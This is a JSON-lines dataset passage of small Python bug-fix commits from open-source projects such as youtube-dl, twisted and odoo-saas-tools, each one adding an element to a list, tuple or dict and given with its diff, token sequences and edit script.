\"T\"], 3], [\"Insert\", [\"list\", 3, 30, 3, 53], [\",:,\", \"T\"], 5]]"}
{"project": "reverence", "commit_sha": "083345255e967a5a2954b12a6a01b7da506de882", "parent_sha": "3d47d98166ff254aa1216bffd56642c97dc9297a", "file_path": "src/fsd.py", "project_url": "https://github.com/jobava-eve/reverence", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -346,7 +346,7 @@ class FSD_NamedVector(object):\n \tdef __getattr__(self, name):\n \t\ttry:\n \t\t\treturn self.data[self._getKeyIndex(name)]\n-\t\texcept (KeyError, IndexError) as e:\n+\t\texcept (TypeError, KeyError, IndexError) as e:\n \t\t\traise AttributeError(str(e))\n \n \tdef __repr__(self):\n", "before": "try : return self . data [ self . _getKeyIndex ( name ) ] except ( KeyError , IndexError ) as e : raise AttributeError ( str ( e ) )", "after": "try : return self . data [ self . _getKeyIndex ( name ) ] except ( TypeError , KeyError , IndexError ) as e : raise AttributeError ( str ( e ) )", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Move\", [\"identifier:KeyError\", 3, 11, 3, 19], [\"tuple\", 3, 10, 3, 32], 2], [\"Insert\", [\"tuple\", 3, 10, 3, 32], [\"identifier:TypeError\", \"T\"], 1], [\"Insert\", [\"tuple\", 3, 10, 3, 32], [\",:,\", \"T\"], 3]]"}
{"project": "WikiVentures", "commit_sha": "a1d37ee493b261ea4f21034b71e9df93f890a126", "parent_sha": "c6c21c3ce6eed48fcf9b00b4b9bf66a0522695a0", "file_path": "main.py", "project_url": "https://github.com/Bboatman/WikiVentures", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -114,7 +114,7 @@ class GameScreen(Screen):\n     def on_enter(self):\n         try:\n             self.game.remake_system(self.game.source)\n-            self.game.path = []\n+            self.game.path = [self.game.source]\n         except AttributeError:\n             self.game = Game()\n             self.scrollview = ScrollView(\n", "before": "self . game . path = [ ]", "after": "self . game . path = [ self . game . source ]", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"list\", 3, 30, 3, 32], [\"attribute\", \"N0\"], 1], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:source\", \"T\"], 2], [\"Insert\", \"N1\", [\"identifier:self\", \"T\"], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:game\", \"T\"], 2]]"}
{"project": "nilearn", "commit_sha": "c8fca557aa7da1bf20139c01a696d7de1128d616", "parent_sha": "ac3b131e0955658af2ca01f140fbd36b1376a749", "file_path": "nilearn/image/tests/test_image.py", "project_url": "https://github.com/hanke/nilearn", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -471,7 +471,7 @@ def test_math_img_exceptions():\n def test_math_img():\n     img1 = Nifti1Image(np.ones((10, 10, 10, 10)), np.eye(4))\n     img2 = Nifti1Image(np.zeros((10, 10, 10, 10)), np.eye(4))\n-    expected_result = Nifti1Image(np.ones((10, 10)), np.eye(4))\n+    expected_result = Nifti1Image(np.ones((10, 10, 10)), np.eye(4))\n \n     formula = \"np.mean(img1, axis=-1) - np.mean(img2, axis=-1)\"\n     result = math_img(formula, img1=img1, img2=img2)\n", "before": "expected_result = Nifti1Image ( np . ones ( ( 10 , 10 ) ) , np . eye ( 4 ) )", "after": "expected_result = Nifti1Image ( np . ones ( ( 10 , 10 , 10 ) ) , np . eye ( 4 ) )", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"tuple\", 3, 43, 3, 51], [\",:,\", \"T\"], 4], [\"Insert\", [\"tuple\", 3, 43, 3, 51], [\"integer:10\", \"T\"], 5]]"}
{"project": "odoo-saas-tools", "commit_sha": "388dc7bb60e882493b8bac296e66a17743a96127", "parent_sha": "a01fcffce6d2981723ee7cf833ece23af74ede14", "file_path": "saas_server/models/saas_server.py", "project_url": "https://github.com/QinerTech/odoo-saas-tools", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -131,7 +131,7 @@ class SaasServerClient(models.Model):\n         oauth_provider = None\n         if is_template_db and not client_env.ref('saas_server.saas_oauth_provider', raise_if_not_found=False):\n             oauth_provider_data = {'enabled': False, 'client_id': client_id}\n-            for attr in ['name', 'auth_endpoint', 'scope', 'validation_endpoint', 'data_endpoint', 'css_class', 'body']:\n+            for attr in ['name', 'auth_endpoint', 'scope', 'validation_endpoint', 'data_endpoint', 'css_class', 'body', 'enabled']:\n                 oauth_provider_data[attr] = getattr(saas_oauth_provider, attr)\n             oauth_provider = client_env['auth.oauth.provider'].create(oauth_provider_data)\n             client_env['ir.model.data'].create({\n", "before": "for attr in [ 'name' , 'auth_endpoint' , 'scope' , 'validation_endpoint' , 'data_endpoint' , 'css_class' , 'body' ] : oauth_provider_data [ attr ] = getattr ( saas_oauth_provider , attr )", "after": "for attr in [ 'name' , 'auth_endpoint' , 'scope' , 'validation_endpoint' , 'data_endpoint' , 'css_class' , 'body' , 'enabled' ] : oauth_provider_data [ attr ] = getattr ( saas_oauth_provider , attr )", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"list\", 3, 25, 3, 120], [\",:,\", \"T\"], 14], [\"Insert\", [\"list\", 3, 25, 3, 120], [\"string:'enabled'\", \"T\"], 15]]"}
{"project": "waf-stage", "commit_sha": "49f773b43c142bc2360050bc413fdb387b0c771c", "parent_sha": "b3305568083bddd1f270a249c966c186765cf1a8", "file_path": "waflib/Tools/dmd.py", "project_url": "https://github.com/Rob3rtS/waf-stage", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -12,7 +12,7 @@ def find_dmd(conf):\n \t\"\"\"\n \tFind the program *dmd* or *ldc* and set the variable *D*\n \t\"\"\"\n-\tconf.find_program(['dmd', 'ldc'], var='D')\n+\tconf.find_program(['dmd', 'ldc', 'ldc2'], var='D')\n \n @conf\n def common_flags_ldc(conf):\n", "before": "conf . find_program ( [ 'dmd' , 'ldc' ] , var = 'D' )", "after": "conf . find_program ( [ 'dmd' , 'ldc' , 'ldc2' ] , var = 'D' )", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"list\", 3, 20, 3, 34], [\",:,\", \"T\"], 4], [\"Insert\", [\"list\", 3, 20, 3, 34], [\"string:'ldc2'\", \"T\"], 5]]"}
{"project": "youtube-dl", "commit_sha": "41292a3827358708f909b44fa368ead0ee6c7eb7", "parent_sha": "20f1be02dffd27385f64d6d4e53e1ccdfdf19589", "file_path": "youtube_dl/__init__.py", "project_url": "https://github.com/ozburo/youtube-dl", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -523,7 +523,7 @@ def _real_main(argv=None):\n     all_urls = batchurls + args\n     all_urls = [url.strip() for url in all_urls]\n     _enc = preferredencoding()\n-    all_urls = [url.decode(_enc, 'ignore') if isinstance(url, bytes) else url]\n+    all_urls = [url.decode(_enc, 'ignore') if isinstance(url, bytes) else url for url in all_urls]\n \n     extractors = gen_extractors()\n \n", "before": "all_urls = [ url . decode ( _enc , 'ignore' ) if isinstance ( url , bytes ) else url ]", "after": "all_urls = [ url . decode ( _enc , 'ignore' ) if isinstance ( url , bytes ) else url for url in all_urls ]", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"assignment\", 3, 5, 3, 79], [\"list_comprehension\", \"N0\"], 2], [\"Move\", \"N0\", [\"[:[\", 3, 16, 3, 17], 0], [\"Move\", \"N0\", [\"conditional_expression\", 3, 17, 3, 78], 1], [\"Insert\", \"N0\", [\"for_in_clause\", \"N1\"], 2], [\"Move\", \"N0\", [\"]:]\", 3, 78, 3, 79], 3], [\"Insert\", \"N1\", [\"for:for\", \"T\"], 0], [\"Insert\", \"N1\", [\"identifier:url\", \"T\"], 1], [\"Insert\", \"N1\", [\"in:in\", \"T\"], 2], [\"Insert\", \"N1\", [\"identifier:all_urls\", \"T\"], 3], [\"Delete\", [\"list\", 3, 16, 3, 79]]]"}
{"project": "odoo-saas-tools", "commit_sha": "985c959de912b3fc94d5c69e32d35a8f0bde8d43", "parent_sha": "5554af15e831334faf3076d598f3a3b5917d8d7c", "file_path": "saas_server/models/saas_server.py", "project_url": "https://github.com/QinerTech/odoo-saas-tools", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -314,7 +314,7 @@ class SaasServerClient(models.Model):\n     def delete_expired_databases(self):\n         now = time.strftime(DEFAULT_SERVER_DATETIME_FORMAT)\n \n-        res = self.search([('state', 'not in', ['deleted']), ('expiration_datetime', '<=', now), ('trial', '=', True)])\n+        res = self.search([('state', 'not in', ['deleted', 'template']), ('expiration_datetime', '<=', now), ('trial', '=', True)])\n         _logger.info('delete_expired_databases %s', res)\n         res.delete_database()\n \n", "before": "res = self . search ( [ ( 'state' , 'not in' , [ 'deleted' ] ) , ( 'expiration_datetime' , '<=' , now ) , ( 'trial' , '=' , True ) ] )", "after": "res = self . search ( [ ( 'state' , 'not in' , [ 'deleted' , 'template' ] ) , ( 'expiration_datetime' , '<=' , now ) , ( 'trial' , '=' , True ) ] )", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"list\", 3, 48, 3, 59], [\",:,\", \"T\"], 2], [\"Insert\", [\"list\", 3, 48, 3, 59], [\"string:'template'\", \"T\"], 3]]"}
{"project": "youtube-dl", "commit_sha": "163d966707a7e49bcdad4ebd9189922b58223395", "parent_sha": "85729c51afad484ef784faf5d82bad8acab77d5e", "file_path": "youtube_dl/downloader/external.py", "project_url": "https://github.com/ozburo/youtube-dl", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -75,7 +75,7 @@ class ExternalFD(FileDownloader):\n \n class CurlFD(ExternalFD):\n     def _make_cmd(self, tmpfilename, info_dict):\n-        cmd = [self.exe, '-o', tmpfilename]\n+        cmd = [self.exe, '--location', '-o', tmpfilename]\n         for key, val in info_dict['http_headers'].items():\n             cmd += ['--header', '%s: %s' % (key, val)]\n         cmd += self._source_address('--interface')\n", "before": "cmd = [ self . exe , '-o' , tmpfilename ]", "after": "cmd = [ self . exe , '--location' , '-o' , tmpfilename ]", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"list\", 3, 15, 3, 44], [\"string:'--location'\", \"T\"], 3], [\"Insert\", [\"list\", 3, 15, 3, 44], [\",:,\", \"T\"], 4]]"}
{"project": "youtube-dl", "commit_sha": "fac39cccd47555af5e9ba2c9f5f36f8ff3b628ad", "parent_sha": "b68e00b08ae60e60d9f5c2654884f3c58595075f", "file_path": "youtube_dl/extractor/odnoklassniki.py", "project_url": "https://github.com/ozburo/youtube-dl", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -176,7 +176,7 @@ class OdnoklassnikiIE(InfoExtractor):\n             })\n             return info\n \n-        quality = qualities(('mobile', 'lowest', 'low', 'sd', 'hd'))\n+        quality = qualities(('mobile', 'lowest', 'low', 'sd', 'hd', 'full'))\n \n         formats = [{\n             'url': f['url'],\n", "before": "quality = qualities ( ( 'mobile' , 'lowest' , 'low' , 'sd' , 'hd' ) )", "after": "quality = qualities ( ( 'mobile' , 'lowest' , 'low' , 'sd' , 'hd' , 'full' ) )", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"tuple\", 3, 29, 3, 68], [\",:,\", \"T\"], 10], [\"Insert\", [\"tuple\", 3, 29, 3, 68], [\"string:'full'\", \"T\"], 11]]"}
{"project": "youtube-dl", "commit_sha": "745968bc72f5dcf1271559d58abd3f0d9a2ea01e", "parent_sha": "df235dbba8d8ae3b51ad3432f67d0cb661dadd75", "file_path": "youtube_dl/extractor/mixcloud.py", "project_url": "https://github.com/ozburo/youtube-dl", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -92,7 +92,7 @@ class MixcloudIE(InfoExtractor):\n                 js = self._download_webpage(js_url, track_id, fatal=False)\n                 if js:\n                     KEY_RE_TEMPLATE = r'player\\s*:\\s*{.*?\\b%s\\s*:\\s*([\"\\'])(?P<key>(?:(?!\\1).)+)\\1'\n-                    for key_name in ('value', 'key_value'):\n+                    for key_name in ('value', 'key_value', 'key_value_two'):\n                         key = self._search_regex(\n                             KEY_RE_TEMPLATE % key_name, js, 'key',\n                             default=None, group='key')\n", "before": "for key_name in ( 'value' , 'key_value' ) : key = self . _search_regex ( KEY_RE_TEMPLATE % key_name , js , 'key' , default = None , group = 'key' )", "after": "for key_name in ( 'value' , 'key_value' , 'key_value_two' ) : key = self . _search_regex ( KEY_RE_TEMPLATE % key_name , js , 'key' , default = None , group = 'key' )", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"tuple\", 3, 37, 3, 59], [\",:,\", \"T\"], 4], [\"Insert\", [\"tuple\", 3, 37, 3, 59], [\"string:'key_value_two'\", \"T\"], 5]]"}
{"project": "fink-broker", "commit_sha": "704b798e1c60495b382fb37d201cc2d57f1bab51", "parent_sha": "c476379bc041bb133a2d5edde17920c3595cd5aa", "file_path": "fink_broker/filters.py", "project_url": "https://github.com/astrolabsoftware/fink-broker", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -124,7 +124,7 @@ def load_user_f_and_p(func_name: str, levels: list = [\"one\", \"two\"]):\n     ImportError:\n         Filter or processor `unknownfunc` not found.\n         Available filters are: [['qualitycuts'], ['dist_stream_cut']]\n-        Available processors are: [[], None]\n+        Available processors are: [['cross_match_alerts_per_batch'], None]\n", "before": "Available processors are : [ [ ] , None ]", "after": "Available processors are : [ [ 'cross_match_alerts_per_batch' ] , None ]", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"list\", 3, 36, 3, 38], [\"string:'cross_match_alerts_per_batch'\", \"T\"], 1]]"}
{"project": "youtube-dl", "commit_sha": "955894e72fd8d4fdce5d85fc006d548278e6d9eb", "parent_sha": "287e50b56b4c71da8fd0c3ffdeca9bff5ab0b005", "file_path": "youtube_dl/extractor/vlive.py", "project_url": "https://github.com/ozburo/youtube-dl", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -106,7 +106,7 @@ class VLiveIE(VLiveBaseIE):\n             raise ExtractorError('Unable to log in', expected=True)\n \n     def _call_api(self, path_template, video_id, fields=None):\n-        query = {'appId': self._APP_ID, 'gcc': 'KR'}\n+        query = {'appId': self._APP_ID, 'gcc': 'KR', 'platformType': 'PC'}\n         if fields:\n             query['fields'] = fields\n         try:\n", "before": "query = { 'appId' : self . _APP_ID , 'gcc' : 'KR' }", "after": "query = { 'appId' : self . _APP_ID , 'gcc' : 'KR' , 'platformType' : 'PC' }", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"dictionary\", 3, 17, 3, 53], [\",:,\", \"T\"], 4], [\"Insert\", [\"dictionary\", 3, 17, 3, 53], [\"pair\", \"N0\"], 5], [\"Insert\", \"N0\", [\"string:'platformType'\", \"T\"], 0], [\"Insert\", \"N0\", [\":::\", \"T\"], 1], [\"Insert\", \"N0\", [\"string:'PC'\", \"T\"], 2]]"}
{"project": "neutron", "commit_sha": "be340d1bab015c47650687f97393c6c9015fb537", "parent_sha": "b53c094d83df881156aa646002f95c9643b1b7a5", "file_path": "neutron/agent/linux/ovs_lib.py", "project_url": "https://github.com/promptworks/neutron", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -476,7 +476,7 @@ def get_installed_ovs_usr_version(root_helper):\n \n \n def get_installed_ovs_klm_version():\n-    args = [\"modinfo\", \"openvswitch\"]\n+    args = [\"modinfo\", \"-F vermagic\", \"openvswitch\"]\n     try:\n         cmd = utils.execute(args)\n         for line in cmd.split('\\n'):\n", "before": "args = [ \"modinfo\" , \"openvswitch\" ]", "after": "args = [ \"modinfo\" , \"-F vermagic\" , \"openvswitch\" ]", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"list\", 3, 12, 3, 38], [\"string:\\\"-F vermagic\\\"\", \"T\"], 3], [\"Insert\", [\"list\", 3, 12, 3, 38], [\",:,\", \"T\"], 4]]"}
{"project": "glance", "commit_sha": "e16cffe432ade6fc8d22d422c490bdea8506596f", "parent_sha": "926b6c9db09c55ce9ecca5929f4da8208f9a35f5", "file_path": "glance/api/v1/images.py", "project_url": "https://github.com/promptworks/glance", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -275,7 +275,7 @@ class Controller(controller.BaseController):\n         if source:\n-            for scheme in ['s3', 'swift', 'http']:\n+            for scheme in ['s3', 'swift', 'http', 'rbd']:\n                 if source.lower().startswith(scheme):\n                     return source\n             msg = _(\"External sourcing not supported for store %s\") % source\n", "before": "for scheme in [ 's3' , 'swift' , 'http' ] : if source . lower ( ) . startswith ( scheme ) : return source", "after": "for scheme in [ 's3' , 'swift' , 'http' , 'rbd' ] : if source . lower ( ) . startswith ( scheme ) : return source", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"list\", 1, 27, 1, 50], [\",:,\", \"T\"], 6], [\"Insert\", [\"list\", 1, 27, 1, 50], [\"string:'rbd'\", \"T\"], 7]]"}
{"project": "twisted", "commit_sha": "47fce5f963f0fcec640575530dc5e382b169ad57", "parent_sha": "b630cc8ec92ec9f844b29419ecab2aef6655004a", "file_path": "twisted/web/microdom.py", "project_url": "https://github.com/longaccess/twisted", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -306,7 +306,7 @@ class Element(Node):\n             w('\"')\n             w(html.escape(val))\n             w('\"')\n-        if self.childNodes or self.tagName.lower() in ('a', 'li', 'div', 'span'):\n+        if self.childNodes or self.tagName.lower() in ('a', 'li', 'div', 'span', 'title'):\n             w(\">\")\n             for child in self.childNodes:\n                 child.writexml(stream, indent+addindent, addindent, newl, strip)\n", "before": "if self . childNodes or self . tagName . lower ( ) in ( 'a' , 'li' , 'div' , 'span' ) : w ( \">\" ) for child in self . childNodes : child . writexml ( stream , indent + addindent , addindent , newl , strip )", "after": "if self . childNodes or self . tagName . lower ( ) in ( 'a' , 'li' , 'div' , 'span' , 'title' ) : w ( \">\" ) for child in self . childNodes : child . writexml ( stream , indent + addindent , addindent , newl , strip )", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"tuple\", 3, 55, 3, 81], [\",:,\", \"T\"], 8], [\"Insert\", [\"tuple\", 3, 55, 3, 81], [\"string:'title'\", \"T\"], 9]]"}
{"project": "twisted", "commit_sha": "8df0847bd2d7c0cbbcc8e1872c6c8e01015572ec", "parent_sha": "93776c9b3198d95b81373a5e83391869b181c454", "file_path": "twisted/internet/unix.py", "project_url": "https://github.com/longaccess/twisted", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -67,7 +67,7 @@ class Port(tcp.Port):\n             skt = self.createInternetSocket()\n             skt.bind(self.port)\n         except socket.error, le:\n-            raise CannotListenError, (self.port, le)\n+            raise CannotListenError, (None, self.port, le)\n         else:\n             # Make the socket readable and writable to the world.\n             os.chmod(self.port, 0666)\n", "before": "CannotListenError , ( self . port , le )", "after": "CannotListenError , ( None , self . port , le )", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"tuple\", 3, 38, 3, 53], [\"none:None\", \"T\"], 1], [\"Insert\", [\"tuple\", 3, 38, 3, 53], [\",:,\", \"T\"], 2]]"}
{"project": "django-model-i18n", "commit_sha": "2c2535e22644679daec7b5c0ccdb2fcf6fa74864", "parent_sha": "25bd48286d8996fe6a45864e1d536de8c6588534", "file_path": "model_i18n/translator.py", "project_url": "https://github.com/hzdg/django-model-i18n", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -70,7 +70,7 @@ class Translator(object):\n         # using translation_class options\n         tmodel = self.create_translation_model(master_model, opts)\n         tmodel.__unicode__ = lambda s: unicode(getattr(s, s._transmeta.master_field_name))\n-        defaults = {'blank': True, 'null': True, 'editable': False}\n+        defaults = {'blank': True, 'null': True, 'editable': False, 'related_name': '%(app_label)s_%(class)s_related'}\n         m2mfield = models.ManyToManyField(tmodel, **defaults)\n         master_model.add_to_class(\"translations\", m2mfield)\n \n", "before": "defaults = { 'blank' : True , 'null' : True , 'editable' : False }", "after": "defaults = { 'blank' : True , 'null' : True , 'editable' : False , 'related_name' : '%(app_label)s_%(class)s_related' }", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"dictionary\", 3, 20, 3, 68], [\",:,\", \"T\"], 6], [\"Insert\", [\"dictionary\", 3, 20, 3, 68], [\"pair\", \"N0\"], 7], [\"Insert\", \"N0\", [\"string:'related_name'\", \"T\"], 0], [\"Insert\", \"N0\", [\":::\", \"T\"], 1], [\"Insert\", \"N0\", [\"string:'%(app_label)s_%(class)s_related'\", \"T\"], 2]]"}
{"project": "mapproxy", "commit_sha": "a5e2dbf79e715d1c530695211df343156969b540", "parent_sha": "a88bd57a85c401ce28859dc11770feb991098d6b", "file_path": "mapproxy/request/wms/__init__.py", "project_url": "https://github.com/camptocamp/mapproxy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -230,7 +230,7 @@ class WMSMapRequest(WMSRequest):\n     def validate_styles(self):\n         if 'styles' in self.params:\n             styles = self.params['styles']\n-            if not set(styles.split(',')).issubset(set(['default', ''])):\n+            if not set(styles.split(',')).issubset(set(['default', '', 'inspire_common:DEFAULT'])):\n                 raise RequestError('unsupported styles: ' + self.params['styles'],\n                                    code='StyleNotDefined', request=self)\n \n", "before": "if not set ( styles . split ( ',' ) ) . issubset ( set ( [ 'default' , '' ] ) ) : raise RequestError ( 'unsupported styles: ' + self . params [ 'styles' ] , code = 'StyleNotDefined' , request = self )", "after": "if not set ( styles . split ( ',' ) ) . issubset ( set ( [ 'default' , '' , 'inspire_common:DEFAULT' ] ) ) : raise RequestError ( 'unsupported styles: ' + self . params [ 'styles' ] , code = 'StyleNotDefined' , request = self )", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"list\", 3, 56, 3, 71], [\",:,\", \"T\"], 4], [\"Insert\", [\"list\", 3, 56, 3, 71], [\"string:'inspire_common:DEFAULT'\", \"T\"], 5]]"}
{"project": "aws-cli", "commit_sha": "1fb91fe8b82a3191f45972c33efd74072971f225", "parent_sha": "dd8f5fab3d542f3eced6d0a1c438dc9490ad614c", "file_path": "tests/unit/test_version.py", "project_url": "https://github.com/swipely/aws-cli", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -25,7 +25,7 @@ AWS_CMD = os.path.join(\n class TestVersion(unittest.TestCase):\n \n     def test_session_can_be_passed_in(self):\n-        process = Popen([AWS_CMD, '--version'], stdout=PIPE, stderr=PIPE)\n+        process = Popen(['python', AWS_CMD, '--version'], stdout=PIPE, stderr=PIPE)\n         stdout, stderr = process.communicate()\n         stderr = stderr.decode('utf-8')\n         self.assertTrue(stderr.startswith('aws-cli'), stderr)\n", "before": "process = Popen ( [ AWS_CMD , '--version' ] , stdout = PIPE , stderr = PIPE )", "after": "process = Popen ( [ 'python' , AWS_CMD , '--version' ] , stdout = PIPE , stderr = PIPE )", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Move\", [\"identifier:AWS_CMD\", 3, 26, 3, 33], [\"list\", 3, 25, 3, 47], 2], [\"Insert\", [\"list\", 3, 25, 3, 47], [\"string:'python'\", \"T\"], 1], [\"Insert\", [\"list\", 3, 25, 3, 47], [\",:,\", \"T\"], 3]]"}
{"project": "plone.app.contentrules", "commit_sha": "8015b961272f5a4169a8e4327481c1a62f42725f", "parent_sha": "8fd2b48ecf931134511fd269ef3644624492945b", "file_path": "plone/app/contentrules/tests/test_azax_view.py", "project_url": "https://github.com/makinacorpus/plone.app.contentrules", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -57,7 +57,7 @@ class AzaxContentRulesTestCase(KSSAndPloneTestCase):\n         res = view.replaceFilteredRulesForm(ruleType='state-enabled')\n         self.assertEquals(res, [\n             {'selectorType': '',\n-             'params': {'html': u'\\n<form style=\"display: inline\" method=\"POST\" id=\"rules_table_form\" action=\"http://nohost/plone/Members/test_user_1_/@@rules-controlpanel\">\\n</form>\\n'},\n+             'params': {'html': u'\\n<form style=\"display: inline\" method=\"POST\" id=\"rules_table_form\" action=\"http://nohost/plone/Members/test_user_1_/@@rules-controlpanel\">\\n</form>\\n', 'withKssSetup': u'True'},\n              'name': 'replaceHTML', 'selector': '#rules_table_form'\n              }\n             ])\n", "before": "self . assertEquals ( res , [ { 'selectorType' : '' , 'params' : { 'html' : u'\\n<form style=\"display: inline\" method=\"POST\" id=\"rules_table_form\" action=\"http://nohost/plone/Members/test_user_1_/@@rules-controlpanel\">\\n</form>\\n' } , 'name' : 'replaceHTML' , 'selector' : '#rules_table_form' } ] )", "after": "self . assertEquals ( res , [ { 'selectorType' : '' , 'params' : { 'html' : u'\\n<form style=\"display: inline\" method=\"POST\" id=\"rules_table_form\" action=\"http://nohost/plone/Members/test_user_1_/@@rules-controlpanel\">\\n</form>\\n' , 'withKssSetup' : u'True' } , 'name' : 'replaceHTML' , 'selector' : '#rules_table_form' } ] )", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"dictionary\", 3, 24, 3, 187], [\",:,\", \"T\"], 2], [\"Insert\", [\"dictionary\", 3, 24, 3, 187], [\"pair\", \"N0\"], 3], [\"Insert\", \"N0\", [\"string:'withKssSetup'\", \"T\"], 0], [\"Insert\", \"N0\", [\":::\", \"T\"], 1], [\"Insert\", \"N0\", [\"string:u'True'\", \"T\"], 2]]"}
{"project": "Products.Ploneboard", "commit_sha": "3724c25dfcba8939367009b837e7bcc16a74b1e7", "parent_sha": "293bc1de31f2104a45314fbb4059a783531236a8", "file_path": "Member.py", "project_url": "https://github.com/makinacorpus/Products.Ploneboard", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -371,7 +371,7 @@ class Member(VariableSchemaSupport, BaseContent):\n         self.id = str(userid)\n         self._userInfo = None\n         self.password = ''\n-        self.roles = ()\n+        self.roles = ('Member',)\n         self.domains = ()\n \n         # for plone compatibility\n", "before": "self . roles = ( )", "after": "self . roles = ( 'Member' , )", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"tuple\", 3, 22, 3, 24], [\"string:'Member'\", \"T\"], 1], [\"Insert\", [\"tuple\", 3, 22, 3, 24], [\",:,\", \"T\"], 2]]"}
{"project": "omnomnorth", "commit_sha": "b53de2be4eb669a54ede8257c8a39604c52bfe97", "parent_sha": "ba24e4579d5e7b4b3b952c474f8bf577dd95a3b4", "file_path": "run.py", "project_url": "https://github.com/lab11/omnomnorth", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -22,7 +22,7 @@ def gen_info():\n     info = {}\n     start = datetime.date(2012, 06, 2)\n     info['days'] = (datetime.date.today() - start).days\n-    info['area_order'] = ['oncampus', 'prfe', 'krogerville', 'plymouth']\n+    info['area_order'] = ['oncampus', 'prfe', 'krogerville', 'plymouth', 'west']\n     return info\n \n \n", "before": "info [ 'area_order' ] = [ 'oncampus' , 'prfe' , 'krogerville' , 'plymouth' ]", "after": "info [ 'area_order' ] = [ 'oncampus' , 'prfe' , 'krogerville' , 'plymouth' , 'west' ]", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"list\", 3, 26, 3, 73], [\",:,\", \"T\"], 8], [\"Insert\", [\"list\", 3, 26, 3, 73], [\"string:'west'\", \"T\"], 9]]"}
{"project": "easy-thumbnails", "commit_sha": "e387db40391cc0ad24f21c6319bb82fa3d43979b", "parent_sha": "29a9aced5d00931e8bf35016f2cfb2c771b12e36", "file_path": "easy_thumbnails/utils.py", "project_url": "https://github.com/eldarion/easy-thumbnails", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -104,7 +104,7 @@ def exif_orientation(im):\n     try:\n         exif = im._getexif()\n-    except (AttributeError, IndexError, KeyError, IOError):\n+    except (AttributeError, IndexError, KeyError, IOError, OverflowError):\n         exif = None\n     if exif:\n         orientation = exif.get(0x0112)\n", "before": "try : exif = im . _getexif ( ) except ( AttributeError , IndexError , KeyError , IOError ) : exif = None", "after": "try : exif = im . _getexif ( ) except ( AttributeError , IndexError , KeyError , IOError , OverflowError ) : exif = None", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"tuple\", 2, 12, 2, 59], [\",:,\", \"T\"], 8], [\"Insert\", [\"tuple\", 2, 12, 2, 59], [\"identifier:OverflowError\", \"T\"], 9]]"}
